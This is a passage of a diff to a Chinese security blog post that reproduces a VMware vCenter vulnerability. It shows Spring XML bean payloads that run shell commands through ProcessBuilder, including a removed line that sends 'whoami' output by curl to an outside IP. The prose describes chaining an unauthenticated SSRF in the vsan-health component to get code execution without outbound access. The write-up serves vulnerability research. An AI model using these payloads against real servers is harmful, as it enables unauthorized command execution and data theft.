alt="25"><br>所以在执行SpEL时，可以将命令暂时存到<code>systemProperties</code>中，然后利用<code>getProperty</code>方法获取回显，所以最终的content.xml内容为：  </p>
+<pre><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+       xsi:schemaLocation=&quot;
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
+        &lt;constructor-arg&gt;
+          &lt;list&gt;
             &lt;value&gt;/bin/bash&lt;/value&gt;
             &lt;value&gt;-c&lt;/value&gt;
-            &lt;value&gt;curl 1.15.222.79:1234?`whoami`&lt;/value&gt;
-        &lt;/list&gt;
-    &lt;/constructor-arg&gt;
-    &lt;property name=&quot;whatever&quot; value=&quot;#&#123;pb.start()&#125;&quot; /&gt;
-&lt;/bean&gt;
+            &lt;value&gt;&lt;![CDATA[ whoami 2&gt;&amp;1 ]]&gt;&lt;/value&gt;
+          &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+    &lt;bean id=&quot;is&quot; class=&quot;java.io.InputStreamReader&quot;&gt;
+        &lt;constructor-arg&gt;
+            &lt;value&gt;#&#123;pb.start().getInputStream()&#125;&lt;/value&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+    &lt;bean id=&quot;br&quot; class=&quot;java.io.BufferedReader&quot;&gt;
+        &lt;constructor-arg&gt;
+            &lt;value&gt;#&#123;is&#125;&lt;/value&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+    &lt;bean id=&quot;collectors&quot; class=&quot;java.util.stream.Collectors&quot;&gt;&lt;/bean&gt;
+    &lt;bean id=&quot;system&quot; class=&quot;java.lang.System&quot;&gt;
+        &lt;property name=&quot;whatever&quot; value=&quot;#&#123; system.setProperty(&amp;quot;output&amp;quot;, br.lines().collect(collectors.joining(&amp;quot;\n&amp;quot;))) &#125;&quot;/&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;
 </code></pre>
-</beans>
-```  
-![23](23.jpg)  
-### 不出网情况
-漏洞本质的利用就是获取一个恶意xml文件的内容，而java本身又没有data伪协议，所以需要寻找其他的利用方法，比如返回内容可控的ssrf或者文件上传之类的漏洞。根据漏洞作者的文章得知，利用了`vsan-health`组件中位于`/usr/lib/vmware-vpx/vsan-health/pyMoVsan/`的`VsanHttpProvider.py`，该处存在着未授权访问的ssrf，还是不懂是怎么找到这样的利用方式的T T.漏洞代码如下：
-![24](24.jpg)
-通过`urlopen`库函数进行http请求，解压返回内容，匹配文件名为`.*offline_bundle.*`的文件并返回内容。python的`urlopen`支持data伪协议，所以可以构造压缩包并base64编码。  
-但是这样虽然可以不出网利用，但是无法回显结果。通过查看Bean列表，发现存在`systemProperties`的bean，该bean也存在方法可以获取属性内容：
-![25](25.jpg)
-所以在执行SpEL时，可以将命令暂时存到`systemProperties`中，然后利用`getProperty`方法获取回显，所以最终的content.xml内容为：  
-```  
-<beans xmlns="http://www.springframework.org/schema/beans"
-       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-       xsi:schemaLocation="
-     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder">
-        <constructor-arg>
-          <list>
-            <value>/bin/bash</value>
-            <value>-c</value>
-            <value><![CDATA[ whoami 2>&1 ]]></value>
-          </list>
-        </constructor-arg>
-    </bean>
-    <bean id="is" class="java.io.InputStreamReader">
-        <constructor-arg>
-            <value>#{pb.start().getInputStream()}</value>
-        </constructor-arg>
-    </bean>
-    <bean id="br" class="java.io.BufferedReader">
-        <constructor-arg>
-            <value>#{is}</value>
-        </constructor-arg>
-    </bean>
-    <bean id="collectors" class="java.util.stream.Collectors"></bean>
-    <bean id="system" class="java.lang.System">
-        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
-    </bean>
-</beans>
-```  
-最终利用需要发两次http请求，第一个请求利用h5-vsan组件，ssrf去请求本地的vsan Health组件，返回内容可控的XML文件内容，XML文件会执行命令并存入System Properties中，第二个请求调用`systemProperties`bean的`getProperty`方法获取输出，最终攻击效果如下：  
-![26](26.jpg)
-![27](27.jpg)
-很奇怪的一点是，我只有u2的版本能够成功不出网利用，但是明明该漏洞是u3n修复的，u3的几个版本网上的师傅们能够打，但是我的就不行。vcenter真的很迷，有时候还会突然打不了了，而且奇奇怪怪的缓存问题会直接把服务跑崩了。  
+<p>最终利用需要发两次http请求，第一个请求利用h5-vsan组件，ssrf去请求本地的vsan Health组件，返回内容可控的XML文件内容，XML文件会执行命令并存入System Properties中，第二个请求调用<code>systemProperties</code>bean的<code>getProperty</code>方法获取输出，最终攻击效果如下：<br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/26.jpg" alt="26"><br><img src="/2023/05/16/vcenter%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/27.jpg" alt="27"><br>很奇怪的一点是，我只有u2的版本能够成功不出网利用，但是明明该漏洞是u3n修复的，u3的几个版本网上的师傅们能够打，但是我的就不行。vcenter真的很迷，有时候还会突然打不了了，而且奇奇怪怪的缓存问题会直接把服务跑崩了。  </p>
+
       
     </div>
 
@@ -716,12 +731,12 @@ function getFlag()&#123;
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">18k</span>
+    <span title="站点总字数">19k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">33 分钟</span>
+    <span title="站点阅读时长">34 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
